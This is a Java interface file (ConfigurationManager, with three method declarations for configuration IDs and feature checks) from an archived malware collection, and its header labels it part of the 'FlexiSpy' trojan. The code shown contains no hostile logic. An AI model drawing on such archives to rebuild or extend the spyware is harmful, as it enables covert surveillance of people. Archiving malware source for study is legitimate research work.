/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.configurationmanager;

public interface ConfigurationManager {
	public void updateConfigurationID(int configurationID);
	public boolean isSupportedFeature(FeatureID featureID);
	public Configuration getConfiguration();
}
